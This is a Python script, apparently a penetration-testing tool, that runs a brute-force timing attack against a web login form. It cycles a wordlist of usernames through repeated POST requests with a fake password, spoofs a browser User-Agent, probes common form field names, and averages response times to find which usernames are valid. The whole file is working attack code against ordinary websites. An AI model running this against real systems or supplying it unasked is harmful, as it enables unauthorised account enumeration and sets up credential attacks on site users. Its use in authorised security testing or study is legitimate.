import sys
import requests
import os.path
import argparse
import validators
from samplelists.formfields import userfields, passfields

# Instantiate the parser
parser = argparse.ArgumentParser(description='Simple brute-force timing attack to get valid username based on average-time after n login requests.')

# Required positional arguments
parser.add_argument('-w', '--wordlist', type=str, help='Wordlist file with the list of usernames.')
parser.add_argument('-u', '--url', type=str, help='Target URL with login form to attack.')

# Optional positional argument
parser.add_argument('-n', '--rounds', type=int, default=5, help='Number of attempts per userID to gain statistical significance (default 5).')
parser.add_argument('-X', '--http-method', type=str, default='POST', help='Specifies the HTTP method for the request (defaults to POST).')

# Parse arguments
args = parser.parse_args()

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

"""
Wordlist is expected as simple list only containing userid,
password is mocked as we are not interested in its value at this point
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
Perform checks against possible username/password field names and get valid ones
"""
def preflight_request(url):
    # perform target URL request one time
    data={'username': 'foo', 'password': 'foobar', "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print(res.text)

    # look for matching fieldnames from page source
    for x in range(len(userfields)):
        for y in range(len(passfields)):
            print(userfields[x], passfields[y])
            userfield='name="{}"'.format(userfields[x])
            passfield='name="{}"'.format(passfields[y])
            if userfield in res.text and passfield in res.text:
                print("[+] Correct combination found!")

"""
Send POST request to endpoint based on known user/pass field name params
"""
def do_average_post_request(url, userid, passwd, headers, rounds, userField="userid", passField="passwd"):
    data = {userField: userid, passField: passwd, "submit": "submit"}
    total_time = 0
    average_time = 0

    for x in range(rounds):
        res = requests.post(url, headers=headers, data=data)
        total_time += res.elapsed.total_seconds()

    average_time = total_time / rounds
    print("[+] user {:15}; rounds {}; average time {}".format(userid, rounds, average_time))

    return average_time

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if args.wordlist and (len(args.wordlist) > 1) and (os.path.isfile(args.wordlist)):
        fname = args.wordlist
    else:
        print("[!] Please provide a wordlist.")
        print("[-] Usage: python3 {} -w /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    if args.url and (len(args.url) > 1) and validators.url(args.url):
        url = args.url
    else:
        print("[!] Please provide a valid URL.")
        print("[-] Usage: python3 {} -u http://target.url".format(sys.argv[0]))
        sys.exit()

    preflight_request(url)

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            # perform a number of rounds and get average time
            res = do_average_post_request(url, userid, passwd, headers, args.rounds)

if __name__ == "__main__":
    main()
